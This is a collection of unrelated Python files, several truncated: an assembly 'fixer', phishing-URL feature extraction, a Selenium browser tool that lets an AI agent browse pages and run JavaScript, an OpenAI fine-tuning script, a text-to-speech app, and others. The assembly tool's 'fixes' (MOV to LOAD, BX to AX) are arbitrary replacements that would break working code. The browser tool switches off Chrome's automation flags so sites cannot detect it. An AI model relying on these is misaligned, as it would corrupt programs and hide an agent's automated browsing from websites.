    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thurs Jan  1 11:42:47 2025\r\n\r\n@author: IAN CARTER KULANI\r\n\"\"\"\r\nfrom colorama import Fore\r\nimport pyfiglet\r\nimport os\r\nfont=pyfiglet.figlet_format(\"BINARY TOOL\")\r\nprint(Fore.GREEN+font)\r\n\r\nimport re\r\n\r\n# Function to read the assembly file\r\ndef read_file(file_path):\r\n    \"\"\"Reads the content of an assembly file.\"\"\"\r\n    try:\r\n        with open(file_path, 'r') as file:\r\n            return file.read()\r\n    except FileNotFoundError:\r\n        print(f\"Error: File {file_path} not found.\")\r\n        return None\r\n\r\n# Function to save the modified assembly code to a file\r\ndef save_file(file_path, content):\r\n    \"\"\"Saves the modified assembly content to a new file.\"\"\"\r\n    with open(file_path, 'w') as file:\r\n        file.write(content)\r\n    print(f\"File saved as {file_path}\")\r\n\r\n# Function to analyze and fix common issues in the assembly code\r\ndef analyze_and_fix(code):\r\n    \"\"\"Analyze and fix common assembly code issues.\"\"\"\r\n    \r\n    fixes = []\r\n\r\n    # Example 1: Check for 'MOV' to 'LOAD' replacement (this is just an example fix)\r\n    # Some systems might use 'MOV' for moving data, but we might want to replace it for compatibility or standards.\r\n    if \"MOV\" in code:\r\n        code = code.replace(\"MOV\", \"LOAD\")\r\n        fixes.append(\"Replaced 'MOV' with 'LOAD' for standardization.\")\r\n    \r\n    # Example 2: Check for missing labels (e.g., missing 'LABEL' before jumps)\r\n    # We will assume that jumps (like 'JMP') should always be preceded by a label.\r\n    missing_labels = re.findall(r'\\bJMP\\b(?!\\s+[A-Za-z_][A-Za-z0-9_]*)', code)\r\n    if missing_labels:\r\n        for _ in missing_labels:\r\n            code = code.replace(\"JMP\", \"JMP DEFAULT_LABEL\")  # Add a default label for simplicity\r\n        fixes.append(\"Added default labels for 'JMP' statements.\")\r\n    \r\n    # Example 3: Fixing redundant instructions (e.g., 'NOP' instructions)\r\n    code = re.sub(r'\\bNOP\\s*\\n', '', code)  # Remove redundant NOPs\r\n    if \"NOP\" in code:\r\n        fixes.append(\"Removed redundant 'NOP' instructions.\")\r\n    \r\n    # Example 4: Replace hardcoded values with registers (e.g., 'MOV AX, 0' -> 'MOV AX, [REGISTER]')\r\n    if re.search(r'MOV\\s+[A-Za-z]+\\s*,\\s*\\d+', code):\r\n        code = re.sub(r'MOV\\s+([A-Za-z]+)\\s*,\\s*(\\d+)', r'MOV \\1, [REGISTER]', code)\r\n        fixes.append(\"Replaced hardcoded values with register references.\")\r\n    \r\n    # Example 5: Ensure correct register use (e.g., using AX where BX is used incorrectly)\r\n    if re.search(r'\\bBX\\b', code):\r\n        code = code.replace(\"BX\", \"AX\")\r\n        fixes.append(\"Replaced 'BX' with 'AX' for consistency.\")\r\n    \r\n    return code, fixes\r\n\r\n# Function to prompt user for file path, read file, analyze, fix, and save\r\ndef main():\r\n    print(\"Welcome to the Automated Binary Analysis Tool!\")\r\n\r\n    # Prompt user for the path to the assembly file\r\n    file_path = input(\"Enter the path to the assembly file:\").strip()\r\n\r\n    # Read the file content\r\n    code = read_file(file_path)\r\n    \r\n    if code:\r\n        # Analyze and fix the assembly code\r\n        modified_code, fixes = analyze_and_fix(code)\r\n        \r\n        # Show the applied fixes to the user\r\n        if fixes:\r\n            print(\"\\nApplied fixes:\")\r\n            for fix in fixes:\r\n                print(f\"- {fix}\")\r\n        else:\r\n            print(\"\\nNo fixes applied. The code appears to be fine.\")\r\n        \r\n        # Prompt the user for the path to save the modified file\r\n        save_path = input(\"Enter the path to save the modified file: \").strip()\r\n        save_file(save_path, modified_code)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "# importing required packages\nimport numpy as np\nimport pandas as pd\nfrom sklearn import model_selection\nfrom sklearn.metrics import classification_report,confusion_matrix\nimport requests\nfrom urllib.parse import urlparse, urlencode\nimport ipaddress\nimport re\nimport urllib\nimport urllib.request, urllib.parse, urllib.error\nfrom datetime import datetime\nimport pickle\nfrom string import printable\nfrom keras.models import Model,load_model\nfrom keras.utils import pad_sequences,plot_model\n\n\n# 1 = legitimate\n# 0 = phishing\n\n# 1.Domain of the URL (Domain)\ndef getDomain(url):\n  domain = urlparse(url).netloc\n  if re.match(r\"^www.\",domain):\n    domain = domain.replace(\"www.\",\"\")\n  return domain\n\n# 2.Check for IP address in URL (Have_IP)\ndef havingIP(url):\n  try:\n    ipaddress.ip_address(url)\n    ip = 0\n  except:\n    ip = 1\n  return ip\n\n# 3.Check the presence of @ in URL (Have_At)\ndef haveAtSign(url):\n  if \"@\" in url:\n    at = 0\n  else:\n    at = 1\n  return at\n\n# 4.Finding the length of URL and categorizing (URL_Length)\ndef getLength(url):\n  if len(url) < 54:\n    length = 1\n  else:\n    length = 0\n  return length\n\n# 5.Gives number of '/' in URL (URL_Depth)\ndef getDepth(url):\n  s = urlparse(url).path.split('/')\n  depth = 0\n  for j in range(len(s)):\n    if len(s[j]) != 0:\n      depth = depth+1\n  return depth\n\n# 6.Checking for redirection '//' in the url (Redirection)\ndef redirection(url):\n  pos = url.rfind('//')\n  if pos > 6:\n    if pos > 7:\n      return 0\n    else:\n      return 1\n  else:\n    return 1\n\n# 7.Existence of \u201cHTTPS\u201d Token in the Domain Part of the URL (https_Domain)\ndef httpDomain(url):\n  domain = urlparse(url).netloc\n  if 'https' in domain:\n    return 0\n  else:\n    return 1\n\n#listing shortening services\nshortening_services = r\"bit\\.ly|goo\\.gl|shorte\\.st|go2l\\.ink|x\\.co|ow\\.ly|t\\.co|tinyurl|tr\\.im|is\\.gd|cli\\.gs|\" \\\n                      r\"yfrog\\.com|migre\\.me|ff\\.im|tiny\\.cc|url4\\.eu|twit\\.ac|su\\.pr|twurl\\.nl|snipurl\\.com|\" \\\n                      r\"short\\.to|BudURL\\.com|ping\\.fm|post\\.ly|Just\\.as|bkite\\.com|snipr\\.com|fic\\.kr|loopt\\.us|\" \\\n                      r\"doiop\\.com|short\\.ie|kl\\.am|wp\\.me|rubyurl\\.com|om\\.ly|to\\.ly|bit\\.do|t\\.co|lnkd\\.in|db\\.tt|\" \\\n                      r\"qr\\.ae|adf\\.ly|goo\\.gl|bitly\\.com|cur\\.lv|tinyurl\\.com|ow\\.ly|bit\\.ly|ity\\.im|q\\.gs|is\\.gd|\" \\\n                      r\"po\\.st|bc\\.vc|twitthis\\.com|u\\.to|j\\.mp|buzurl\\.com|cutt\\.us|u\\.bb|yourls\\.org|x\\.co|\" \\\n                      r\"prettylinkpro\\.com|scrnch\\.me|filoops\\.info|vzturl\\.com|qr\\.net|1url\\.com|tweez\\.me|v\\.gd|\" \\\n                      r\"tr\\.im|link\\.zip\\.net\"\n\n# 8.Checking for Shortening Services in URL (Tiny_URL)\ndef tinyURL(url):\n    match=re.search(shortening_services,url)\n    if match:\n        return 0\n    else:\n        return 1\n\n# 9.Checking for Prefix or Suffix Separated by (-) in the Domain (Prefix/Suffix)\ndef prefixSuffix(url):\n    if '-' in urlparse(url).netloc:\n        return 0          \n    else:\n        return 1          \n\n# # 10.Web traffic (Web_Traffic)\n# def web_traffic(url):\n#   try:\n#     #Filling the whitespaces in the URL if any\n#     url = urllib.parse.quote(url)\n#     rank = BeautifulSoup(urllib.request.urlopen(\"http://data.alexa.com/data?cli=10&dat=s&url=\" + url).read(), \"xml\").find(\n#         \"REACH\")['RANK']\n#     rank = int(rank)\n#   except TypeError:\n#         return 0\n#   if rank <100000:\n#     return 0\n#   else:\n#     return 1\n\n# 11.Survival time of domain: The difference between termination time and creation time (Domain_Age)\ndef domainAge(domain_name):\n  creation_date = domain_name.creation_date\n  expiration_date = domain_name.expiration_date\n  if (isinstance(creation_date,str) or isinstance(expiration_date,str)):\n    try:\n      creation_date = datetime.strptime(creation_date,'%Y-%m-%d')\n      expiration_date = datetime.strptime(expiration_date,\"%Y-%m-%d\")\n    except:\n      return 0\n  if ((expiration_date is None) or (creation_date is None)):\n      return 0\n  elif ((type(expiration_date) is list) or (type(creation_date) is list)):\n      return 0\n  else:\n    ageofdomain = abs((expiration_date - creation_date).days)\n    if ((ageofdomain/30) < 6):\n      age = 0\n    else:\n      age = 1\n  return age\n\n# 12.End time of domain: The difference between termination time and current time (Domain_End)\ndef domainEnd(domain_name):\n  expiration_date = domain_name.expiration_date\n  if isinstance(expiration_date,str):\n    try:\n      expiration_date = datetime.strptime(expiration_date,\"%Y-%m-%d\")\n    except:\n      return 0\n  if (expiration_date is None):\n      return 0\n  elif (type(expiration_date) is list):\n      return 0\n  else:\n    today = datetime.now()\n    end = abs((expiration_date - today).days)\n    if ((end/30) < 6):\n      end = 1\n    else:\n      end = 0\n  return end\n\n# 13.IFrame Redirection (iFrame)\ndef iframe(response):\n  if response == \"\":\n      return 0\n  else:\n      if re.findall(r\"[|]\", response.text):\n          return 1\n      else:\n          return 0\n\n# 14.Checks the effect of mouse over on status",
    "import random\nimport difflib\nimport traceback\nimport subprocess\nfrom urllib.parse import urljoin\nfrom selenium import webdriver\nfrom bs4 import BeautifulSoup, Comment\nimport selenium\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\nfrom fraiser.modules.AScrollablePage import AScrollablePage\n\n\nclass AWebBrowser(AScrollablePage):\n    def __init__(self, functions: dict[str, str]):\n        super(AWebBrowser, self).__init__(functions=functions)\n        self.inited = False\n        self.driver = None\n        self.urls = {}\n        self.prompt = '''\nThe text with links are enclosed in square brackets to highlight it. If you need to open the page linked to a certain text, please call GET-LINK<!|text: str, session: str|!> function to get the url, and then call BROWSE<!|url: str, session: str|!>. Please note that the text parameter of GET-LINK must exactly match the content in the square brackets (excluding the square brackets themselves).\nThe forms on the webpage have been listed in text format, and you can use the EXECUTE-JS<!|js_code: str, session: str|!> function to operate the form, such as entering text, clicking buttons, etc. Use triple quotes on your code. Example: \n!EXECUTE-JS<!|\"\"\"\ndocument.querySelector('form.mini-search input[name=\"query\"]').value = \"hello world\";\ndocument.querySelector('form.mini-search').submit();\n\"\"\", \"arxiv_session\"|!>\n'''\n        return\n    \n    def Init(self):\n        if self.inited:\n            return True, \"\"\n        try:\n            subprocess.run(['google-chrome', '--version'], check=True)\n            self.options = webdriver.ChromeOptions()\n            self.options.add_argument('--headless')\n            self.options.add_argument(\"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36\")\n            self.options.add_experimental_option(\"excludeSwitches\", [\"enable-automation\"])\n            self.options.add_argument(\"--disable-blink-features=AutomationControlled\")\n\n            self.driver = webdriver.Chrome(options=self.options)\n            self.inited = True\n            return True, \"\"\n        except Exception as e:\n            return False, f\"webdriver init FAILED. It may be caused by chrome not being installed correctly. please install chrome manually, or let fraiser do it for you. Exception details: {str(e)}\\n{traceback.format_exc()}\"\n    \n    def Browse(self, url: str) -> str:\n        succ, msg = self.Init()\n        if not succ:\n            return msg\n        \n        self.driver.get(url)\n        WebDriverWait(self.driver, 30).until(\n            lambda d: d.execute_script(\"return document.readyState == 'complete'\")\n        )\n\n        soup = BeautifulSoup(self.driver.page_source, 'html.parser')\n        body = soup.find('body')\n        self.LoadPage(self.ProcessNode(body), \"TOP\")\n        return self() + self.prompt\n    \n    def GetFullText(self) -> str:\n        return self.txt if (self.txt != None) else \"\"\n    \n    def GetLink(self, text: str) -> str:\n        if text in self.urls:\n            return self.urls[text]\n        else:\n            prompt = \"Please note that the text you use to query the URL should be the part enclosed in square brackets (excluding the square brackets themselves), otherwise the search will not yield results.\"\n            similars = '\\n'.join(['[' + key + '](' + self.urls[key] + ')' for key in difflib.get_close_matches(text, self.urls, n=3)])\n            if \"\" == similars:\n                return \"No url found on specified text. \\n\" + prompt\n            else:\n                return f\"No exact match found, the most similar URLs are as follows:\\n {similars} \\n{prompt}\"\n    \n    def ScrollDown(self) -> str:\n        return super(AWebBrowser, self).ScrollDown() + self.prompt\n    \n    def ScrollUp(self) -> str:\n        return super(AWebBrowser, self).ScrollUp() + self.prompt\n\n    def SearchDown(self, query: str) -> str:\n        return super(AWebBrowser, self).SearchDown(query) + self.prompt\n    \n    def SearchUp(self, query: str) -> str:\n        return super(AWebBrowser, self).SearchUp(query) + self.prompt\n    \n    def ExecuteJS(self, js_code: dict):\n        try:\n            WebDriverWait(self.driver, 30).until(\n                EC.presence_of_element_located((By.TAG_NAME, \"body\"))\n            )\n            \n            result = self.driver.execute_script(js_code)\n            \n            WebDriverWait(self.driver, 30).until(\n                lambda d: d.execute_script(\"return document.readyState == 'complete'\")\n            )\n            \n            soup = BeautifulSoup(self.driver.page_source, 'html.parser')\n            body = soup.find('body')\n            self.LoadPage(self.ProcessNode(body), \"TOP\")\n            result = \"JavaScript executed successfully.\" if result is None else result\n            return f\"JS execution returned: {result} \\n\\nThe current page content is as follows:",
    "import os\nimport json\nimport time\nimport logging\nfrom pathlib import Path\nfrom datetime import datetime\nfrom dotenv import load_dotenv\nfrom openai import OpenAI\n\n# Set up logging with detailed formatting\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(levelname)s - %(message)s',\n    datefmt='%Y-%m-%d %H:%M:%S'\n)\nlogger = logging.getLogger(__name__)\n\nclass OpenAIFineTuner:\n    def __init__(self):\n        \"\"\"Initialize the OpenAI fine-tuner with API key and file paths.\"\"\"\n        # Load environment variables\n        load_dotenv()\n        api_key = os.getenv('OPENAI_API_KEY')\n        if not api_key:\n            raise ValueError(\"OPENAI_API_KEY not found in environment variables\")\n        \n        self.client = OpenAI(api_key=api_key)\n        logger.info(\"OpenAI client initialized successfully\")\n        \n        # Define file paths using absolute paths\n        self.base_dir = os.path.dirname(os.path.abspath(__file__))\n        self.train_file = os.path.join(self.base_dir, \"OpenAIFineTune\", \"stoney_train.jsonl\")\n        self.valid_file = os.path.join(self.base_dir, \"OpenAIFineTune\", \"stoney_valid.jsonl\")\n        \n        # Ensure files exist\n        if not os.path.exists(self.train_file):\n            raise FileNotFoundError(f\"Training file not found: {self.train_file}\")\n        if not os.path.exists(self.valid_file):\n            raise FileNotFoundError(f\"Validation file not found: {self.valid_file}\")\n        \n        logger.info(f\"Found training file: {self.train_file}\")\n        logger.info(f\"Found validation file: {self.valid_file}\")\n\n    def upload_file(self, file_path: str, purpose: str) -> str:\n        \"\"\"Upload a file to OpenAI and return its file ID.\"\"\"\n        logger.info(f\"Uploading {purpose} file: {file_path}\")\n        \n        with open(file_path, 'rb') as file:\n            response = self.client.files.create(\n                file=file,\n                purpose=purpose\n            )\n        \n        logger.info(f\"Successfully uploaded {purpose} file. File ID: {response.id}\")\n        return response.id\n\n    def create_fine_tuning_job(self, training_file_id: str, validation_file_id: str) -> str:\n        \"\"\"Create a fine-tuning job and return its ID.\"\"\"\n        logger.info(\"Creating fine-tuning job...\")\n        \n        response = self.client.fine_tuning.jobs.create(\n            training_file=training_file_id,\n            validation_file=validation_file_id,\n            model=\"gpt-3.5-turbo\",  # You can change this to gpt-4 if needed\n            hyperparameters={\n                \"n_epochs\": 3  # Adjust as needed\n            }\n        )\n        \n        logger.info(f\"Fine-tuning job created successfully. Job ID: {response.id}\")\n        return response.id\n\n    def monitor_job_progress(self, job_id: str, check_interval: int = 60):\n        \"\"\"Monitor the progress of a fine-tuning job.\"\"\"\n        logger.info(f\"Starting to monitor fine-tuning job: {job_id}\")\n        \n        while True:\n            job = self.client.fine_tuning.jobs.retrieve(job_id)\n            status = job.status\n            \n            # Log detailed status information\n            logger.info(f\"Status: {status}\")\n            if hasattr(job, 'trained_tokens'):\n                logger.info(f\"Trained tokens: {job.trained_tokens}\")\n            if hasattr(job, 'training_accuracy'):\n                logger.info(f\"Training accuracy: {job.training_accuracy}\")\n            if hasattr(job, 'validation_loss'):\n                logger.info(f\"Validation loss: {job.validation_loss}\")\n            \n            if status == \"succeeded\":\n                logger.info(\" Fine-tuning completed successfully!\")\n                logger.info(f\"Fine-tuned model ID: {job.fine_tuned_model}\")\n                break\n            elif status == \"failed\":\n                logger.error(f\" Fine-tuning failed: {job.error}\")\n                break\n            elif status in [\"cancelled\", \"expired\"]:\n                logger.warning(f\" Fine-tuning job {status}\")\n                break\n            \n            logger.info(f\"Waiting {check_interval} seconds before next check...\")\n            time.sleep(check_interval)\n\n    def run_fine_tuning(self):\n        \"\"\"Run the complete fine-tuning process.\"\"\"\n        try:\n            # Step 1: Upload files\n            logger.info(\"Step 1/3: Uploading files to OpenAI\")\n            train_file_id = self.upload_file(self.train_file, \"fine-tune\")\n            valid_file_id = self.upload_file(self.valid_file, \"fine-tune\")\n            \n            # Step 2: Create fine-tuning job\n            logger.info(\"Step 2/3: Creating fine-tuning job\")\n            job_id = self.create_fine_tuning_job(train_file_id, valid_file_id)\n            \n            # Step 3: Monitor progress\n            logger.info(\"Step 3/3: Monitoring fine-tuning progress\")\n            self.monitor_job_progress(job_id)\n            \n        except Exception as e:\n            logger.error(f\" Error during fine-tuning process: {str(e)}\")\n            raise\n\ndef main():\n    \"\"\"Main",
    "import sys\nimport os\nimport torch\nimport gradio as gr\nimport tempfile\n\n\nkokoro_path = os.path.abspath('Kokoro-82M')\nprint(f\"kokoro_path :{kokoro_path}\")\nif kokoro_path not in sys.path:\n    sys.path.insert(0, kokoro_path)\n\ntry:\n    from kokoro import generate\n    from models import build_model\nexcept ImportError:\n    print(\"Kokoro not found. Please install the Kokoro-82M package.\")\n    generate = None\n\n\n# Add the 'src' directory to the Python path\nsrc_path = os.path.abspath('src')\nif src_path not in sys.path:\n    sys.path.insert(0, src_path)\n\nfrom src.long_speech_generation import generate_long_text_optimized\nfrom src.podcast_generation import generate_audio\nfrom src.utils import read_file_content, process_long_text, generate_audio_enhanced\n\n# Import the Tab UI components\nfrom podcast_tab import create_podcast_tab\nfrom text_to_speech_tab import create_text_to_speech_tab\n\n\n\n\nVOICEPACK_DIR = os.path.join(kokoro_path, \"voices\")\n\nMODELS_LIST = {\n    \"v0_19-full-fp32\": os.path.join(kokoro_path, \"kokoro-v0_19.pth\"),\n    \"v0_19-half-fp16\": os.path.join(kokoro_path, \"fp16/kokoro-v0_19-half.pth\"),\n}\n\n# Available voices\nCHOICES = {\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeba American Female \u2b50': 'af',\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeba Bella \u2b50': 'af_bella',\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeba Sarah \u2b50': 'af_sarah',\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeb9 Michael \u2b50': 'am_michael',\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeb9 nicole': 'af_nicole',\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeb9 sky': 'af_sky',\n    '\ud83c\uddfa\ud83c\uddf8 \ud83d\udeb9 Adam': 'am_adam',\n    '\ud83c\uddec\ud83c\udde7 \ud83d\udeba British Female emma': 'bf_emma',\n    '\ud83c\uddec\ud83c\udde7 \ud83d\udeba British Female isabella': 'bf_isabella',\n    '\ud83c\uddec\ud83c\udde7 \ud83d\udeb9 British Male george': 'bm_george',\n    '\ud83c\uddec\ud83c\udde7 \ud83d\udeb9 British Male lewis': 'bm_lewis',\n\n}\n\n# Device Selection\ndevice_options = [\"auto\", \"cpu\", \"cuda\"]\n\n# Initialize model and voices (lazy loading)\nMODEL_NAME = None\nMODEL = None\nMODEL_DEVICE = None\nVOICES = {}\n\n# Text normalization functions (simplified)\ndef normalize_text(text):\n    text = text.replace(\"\u2019\", \"'\")\n    text = re.sub(r'\\s+', ' ', text).strip()\n    return text\n\nSAMPLE_RATE = 24000\n\ndef load_model_and_voice(selected_device, model_path, voice):\n    global MODEL, VOICES, MODELS_LIST, MODEL_NAME, MODEL_DEVICE\n    try:\n        if selected_device == \"auto\":\n            device = 'cuda' if torch.cuda.is_available() else 'cpu'\n        elif selected_device == \"cuda\":\n            if torch.cuda.is_available():\n                print(\"CUDA is available. Using GPU.\")\n                device = 'cuda'\n            else:\n                print(\"CUDA is not available. Using CPU instead.\")\n                device = 'cpu'\n        else:\n            device = 'cpu'\n    except Exception as e:\n        print(\"CUDA Error is not available. Using CPU instead.\")\n        device = 'cpu'\n\n    # Check if we need to reload the model\n    should_reload = (\n        MODEL is None or\n        MODEL_DEVICE != device or\n        MODEL_NAME != model_path\n    )\n\n    if should_reload:\n        MODEL = build_model(model_path, device)\n        MODEL_NAME = model_path\n        MODEL_DEVICE = device\n        print(f\"Loaded model {model_path} on {device}\")\n\n    if voice not in VOICES:\n        VOICES[voice] = torch.load(os.path.join(VOICEPACK_DIR, f'{voice}.pt'), map_location=device)\n        print(f'Loaded voice: {voice} on {device}')\n\n    return MODEL, VOICES[voice]\n\ndef update_input_visibility(choice):\n    return {\n        text_input: gr.update(visible=choice == \"Direct Text\"),\n        file_input: gr.update(visible=choice == \"File Upload\")\n    }\n\n\n# Gradio Interface\nwith gr.Blocks() as app:\n    gr.Markdown(\"\"\"## Local11labs Text-to-Speech Webui\n                This is a simple web interface for the Kokoro-82M text-to-speech model.\"\"\")\n\n    # Text-to-Speech Tab\n    (input_type, text_input, file_input, model_dropdown, voice_dropdown,\n     speed_slider, device_dropdown, process_type, generate_button,\n     audio_output, text_output, status_output) = create_text_to_speech_tab(\n        models_list=MODELS_LIST,\n        choices=CHOICES,\n        device_options=device_options,\n        update_input_visibility=update_input_visibility,\n        load_model_and_voice=load_model_and_voice,\n         \n    )\n\n    # Podcast Tab\n    (generate_podcast_script_button, send_to_audio_input_button, podcast_script_json_output,\n    podcast_dialogue_status_output, podcast_script_json_input, podcast_host_voice_assignment_inputs,\n    podcast_model_dropdown, podcast_speed_slider, podcast_device_dropdown, generate_podcast_audio_button,\n    podcast_audio_output, podcast_audio_status_output) = create_podcast_tab(\n        models_list=MODELS_LIST,\n        choices=CHOICES,\n        device_options=device_options,\n        kokoro_path=kokoro_path,\n        load_model_and_voice=load_model_and_voice,\n        \n         \n    )\n\n# Run the app\nif __name__ == \"__main__\":\n    app.launch(share=True, debug=True)\n",
    "import numpy as np\nimport scipy.io as sio\nfrom sklearn.discriminant_analysis import LinearDiscriminantAnalysis\nfrom skimage.segmentation import slic, mark_boundaries\nfrom sklearn import preprocessing\nfrom sklearn.decomposition import PCA\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import confusion_matrix, accuracy_score, classification_report, cohen_kappa_score\nimport torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom operator import truediv\nimport time\nimport warnings\nimport random\nimport data_reader\nimport HyperSINet\nimport utils\nimport matplotlib.pyplot as plt\nfrom GNN import split_data_graph as split_data\nfrom GNN import create_graph\nfrom GNN import dr_slic\nfrom torchsummaryX import summary\nfrom thop import profile\n# from visualize import visualize_grid_attention_v2\nwarnings.filterwarnings(\"ignore\")\n\n\ndef seed_torch(seed=128,deter=False):\n    '''\n    `deter` means use deterministic algorithms for GPU training reproducibility,\n    if set `deter=True`, please set the environment variable `CUBLAS_WORKSPACE_CONFIG` in advance\n    '''\n    seed = int(seed)\n    random.seed(seed)\n    os.environ['PYTHONHASHSEED'] = str(seed)\n    np.random.seed(seed)\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed(seed)\n    torch.backends.cudnn.benchmark = False\n    torch.backends.cudnn.deterministic = True\n    torch.backends.cudnn.enabled = False\n    torch.use_deterministic_algorithms(deter)\n\n# seed_torch()\ndef load_data():\n    data = data_reader.Houston().normal_cube\n    data_gt = data_reader.Houston().truth\n    data_gt = data_gt.astype('int')\n    return data,data_gt\n\ndata, data_gt = load_data()\nclass_num = np.max(data_gt)\ngt_reshape = np.reshape(data_gt, [-1])\nsamples_type = ['ratio','same_num'][0]\ntrain_ratio = 0.05\nval_ratio = 0.05\ntrain_num = 10\nval_num = class_num\nlearning_rate = 0.001\nmax_epoch = 1000\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\npath_model = r\"/model1\"\npath_data = None\nheight,width,bands = data.shape\n\ndef Get_mat():\n    # split data\n    train_index, val_index, test_index = split_data.split_data(gt_reshape, class_num, train_ratio, val_ratio, train_num,val_num, samples_type)  # \u5212\u5206\u8bad\u7ec3\u96c6\u3001\u9a8c\u8bc1\u96c6\u548c\u6d4b\u8bd5\u96c6,\u5f97\u5230\u5c5e\u4e8e\u4e09\u79cd\u96c6\u7684\u5750\u6807\n    train_samples_gt, test_samples_gt, val_samples_gt = create_graph.get_label(gt_reshape, train_index, val_index,test_index)  # ground_truth\u5212\u5206\u4e3a\u8bad\u7ec3\u96c6\u3001\u9a8c\u8bc1\u673a\u548c\u6d4b\u8bd5\u96c6\uff0c\u7ef4\u5ea6\u662f21025\uff0c\u6839\u636e\u5750\u6807\u5f97\u5230\u5c5e\u4e8e\u5404\u79cd\u96c6\u7684\u7c7b\u522b\n    train_gt = np.reshape(train_samples_gt, [height, width])\n    test_gt = np.reshape(test_samples_gt, [height, width])\n    val_gt = np.reshape(val_samples_gt,[height, width])  # \u7ef4\u5ea6\u90fd\u662f[145,145],reshape\u4e4b\u540e\uff0c\u5bf9\u5e94\u7684\u8bad\u7ec3\u96c6\uff0c\u6d4b\u8bd5\u96c6\uff0c\u9a8c\u8bc1\u96c6\u90fd\u663e\u73b0\u51fa\u6765\u4e86\u3002\u8bad\u7ec3\u96c6\u4e0a\uff0c\u6d4b\u8bd5\u96c6\u548c\u9a8c\u8bc1\u96c6\u5bf9\u5e94\u4f4d\u7f6e\u4e3a0\n\n    train_samples_gt_onehot = create_graph.label_to_one_hot(train_gt, class_num)\n    test_samples_gt_onehot = create_graph.label_to_one_hot(test_gt, class_num)\n    val_samples_gt_onehot = create_graph.label_to_one_hot(val_gt,class_num)  # \u7ef4\u5ea6\u90fd\u662f[145,145,16]\uff0c\u5047\u5982(x,y)\u5c5e\u4e8e\u7b2c9\u7c7b\uff0c\u90a3\u4e48[x,y,9]\u5373\u4e3a1\n\n    train_samples_gt_onehot = np.reshape(train_samples_gt_onehot, [-1, class_num]).astype(int)\n    test_samples_gt_onehot = np.reshape(test_samples_gt_onehot, [-1, class_num]).astype(int)\n    val_samples_gt_onehot = np.reshape(val_samples_gt_onehot, [-1, class_num]).astype(int)  # \u7ef4\u5ea6\u90fd\u662f[21025,16]\n    train_label_mask, test_label_mask, val_label_mask = create_graph.get_label_mask(train_samples_gt, test_samples_gt,val_samples_gt, data_gt,class_num)  # [21025,16]\n\n    train_samples_gt = torch.from_numpy(train_samples_gt.astype(np.float32)).to(device)\n    test_samples_gt = torch.from_numpy(test_samples_gt.astype(np.float32)).to(device)\n    val_samples_gt = torch.from_numpy(val_samples_gt.astype(np.float32)).to(device)\n\n    train_samples_gt_onehot = torch.from_numpy(train_samples_gt_onehot.astype(np.float32)).to(device)\n    test_samples_gt_onehot = torch.from_numpy(test_samples_gt_onehot.astype(np.float32)).to(device)\n    val_samples_gt_onehot = torch.from_numpy(val_samples_gt_onehot.astype(np.float32)).to(device)\n\n    train_label_mask = torch.from_numpy(train_label_mask.astype(np.float32)).to(device)\n    test_label_mask = torch.from_numpy(test_label_mask.astype(np.float32)).to(device)\n    val_label_mask = torch.from_numpy(val_label_mask.astype(np.float32)).to(device)\n\n    net_input = np.array(data, np.float32)\n    net_input = torch.from_numpy(net_input.astype(np.float32)).to(device)\n    return train_samples_gt,test_samples_gt,val_samples_gt,train_samples_gt_onehot,test_samples_gt_onehot,val_samples_gt_onehot,train_label_mask,test_label_mask,val_label_mask,net_input\n\ndef get_Q_and_S_and_Segments(data, scale=50, compactness=1, max_iter=20, sigma=1, min_size_factor=0.1,max_size_factor=2):\n    height, width, bands = data.shape\n    n_segments = height * width / scale  # \u5206\u5272\u6570\n    data = np.reshape(data, [height * width, bands])\n    minMax = preprocessing.StandardScaler()\n    data = minMax.fit_transform(data)\n    data = np.reshape(data, [height, width, bands])\n    img = data\n    segments = slic(img, n_segments=n_segments, compactness=compactness, max_iter=",
    "import os\nimport tkinter as tk\nfrom tkinter import filedialog, messagebox, ttk\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nimport numpy as np\nimport threading\nimport string\nimport nltk\nfrom nltk.corpus import stopwords\nfrom datetime import datetime\nfrom tkinter import font\n\n# Ensure NLTK stopwords are downloaded\nnltk.download('stopwords', quiet=True)\nSTOP_WORDS = set(stopwords.words('english'))\n\nclass DuplicateFinderApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"Obsidian Duplicate Finder\")\n        self.root.minsize(800, 600)\n\n        # Apply a theme\n        style = ttk.Style()\n        style.theme_use('clam')\n\n        self.vault_path = \"\"\n        self.duplicate_groups = []\n        self.file_contents = {}\n        self.setup_gui()\n\n    def setup_gui(self):\n        self.create_menu()\n\n        # Configure fonts\n        self.default_font = font.nametofont(\"TkDefaultFont\")\n        self.default_font.configure(size=10)\n        self.bold_font = self.default_font.copy()\n        self.bold_font.configure(weight=\"bold\")\n\n        main_frame = ttk.Frame(self.root, padding=\"5\")\n        main_frame.grid(row=0, column=0, sticky=\"nsew\")\n\n        # Frame for controls\n        control_frame = ttk.Frame(main_frame)\n        control_frame.grid(row=0, column=0, sticky=\"ew\")\n\n        # Vault selection\n        select_button = ttk.Button(\n            control_frame, text=\"Select Vault Folder\", command=self.select_folder\n        )\n        select_button.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)\n        self.create_tooltip(select_button, \"Select your Obsidian vault folder\")\n\n        self.folder_label = ttk.Label(\n            control_frame, text=\"No folder selected\", font=self.bold_font\n        )\n        self.folder_label.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)\n\n        # Similarity threshold\n        threshold_label = ttk.Label(\n            control_frame, text=\"Similarity Threshold 